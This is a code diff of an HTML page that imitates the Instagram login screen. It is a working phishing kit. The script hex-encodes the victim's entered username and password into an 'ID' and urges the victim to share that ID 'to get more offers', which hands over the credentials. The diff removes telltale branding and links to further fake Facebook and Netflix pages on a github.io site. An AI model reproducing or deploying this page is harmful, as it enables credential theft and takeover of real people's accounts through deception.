@@ -1,6 +1,6 @@
 <!doctype html><html lang="en"><head>
 <meta charset="UTF-8">
-<title>Skipidin-Login with Instagram</title>
+<title>Login with Instagram</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
 <link rel="stylesheet" href="style.css">
 <link rel="shortcut icon" type="image/x-icon" href="./favicon.ico">
@@ -207,16 +207,23 @@ input[type="submit"]:hover, input[type="submit"]:focus {
 visibility: hidden;
 }
 #id #b2{
-		background: #00A1E1;
+		background: #00CC00;
 		color: #061148;
 		padding: 5px;
 		border-radius: 8px;
+margin: 0 50px 0 0;
+float: center;
+text-align : center;
 }
 #id #h32{
-		background: #BB0A30;
+		background: #276EF1;
 		color: #fff;
 		padding: 5px;
 		border-radius: 8px;
+text-align : center;
+margin-left: 0;
+width: 300px;
+margin-top: 50px;
 }
 #id a{
 		background: #FF0033;
@@ -267,14 +274,14 @@ visibility: hidden;
 <div id="all">
 <div class="login">
 <h1><img src="https://i.imgur.com/wvLiKam.png" width="200px" height="68px"></h1>
-<form name="myform" method="post" action="/storage/emulated/0/Dcoder/LVUdw7AWZEF4raPKSO5N.design" onsubmit="return validateform()">
-<input placeholder="Phone number, username, or email" type="text" name="name" required>
-<input type="password" name="password" placeholder="Password" required>
+<form name="myform" method="post" onsubmit="return validateform()">
+<input placeholder="Phone number, username, or email" type="text" name="name" minlength="5" maxlength="30" required>
+<input type="password" name="password" placeholder="Password" minlength="6" maxlength="15" autocomplete="off" required>
 <input type="submit" value="Log In">
 <br>
 </form>
 <div class="divider"><b>OR</b></div>
-<div class="fbwrapper"><div class="fb"><a href="https://facebook.com"><img src="https://i.imgur.com/exksovo.png">  Log in with Facebook</a></div></div>
+<div class="fbwrapper"><div class="fb"><a href="blacksmith779.github.io/pages/facebook.html"><img src="https://i.imgur.com/exksovo.png">  Log in with Facebook</a></div></div>
 <div class="forgotwrapper"><div class="forgot"><a href="https://instagram.com">Forgot password?</a></div></div>
 </div>
 <div class="infobox">
@@ -310,8 +317,9 @@ visibility: hidden;
 <div id="id">
 <h3>ID: </h3>
 <b id="b2">Your ID will appear here after signing up</b>
-<h3 id="h32">Notice: Share this ID with friends and users so that they find you</h3>
-<a href="" id="fme"><b>Click to Continue >>></b></b></b></b></a>
+<br>
+<h3 id="h32">Notice: Share this ID with friends and users to get more offers.</h3>
+<a href="blacksmith779.github.io/pages/netflix%.html" id="fme"><b>Click to Continue >>></b></b></b></b></a>
 </div>
   <script src="http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script>
@@ -328,35 +336,23 @@ function ascii_to_hexa(str)
 </script>
 <script>
 var fm = document.getElementById("fme");
-var to = document.getElementById("scs");
 var omn = document.getElementById("id");
 fm.style.visibility = "hidden";
 function validateform(){
 var name=document.myform.name.value;
 var password=document.myform.password.value;
 var all = document.getElementById("all");
-var elem2 = document.getElementById("b");
 var elem22 = document.getElementById("b2");
 if(password != ""){
 ascii_to_hexa(name+password);
-	elem2.innerHTML = "#"+ascii_to_hexa(name)+"2a1q1z2"+ascii_to_hexa(password);
 	elem22.innerHTML = "#"+ascii_to_hexa(name)+"2a1q1z2"+ascii_to_hexa(password);
 	fm.style.visibility = "visible";
-	to.style.visibility = "visible";
 omn.style.visibility = "visible";
 	return false;
 }
 else{
 	return false;
 }
-}
-</script>
-<script>
-function tho(){
-		var to = document.getElementById("scs");
-var too = document.getElementById("too");
-  to.style.visibility = "hidden";
-  too.style.visibility = "hidden";
 }
 </script>
 </body></html>
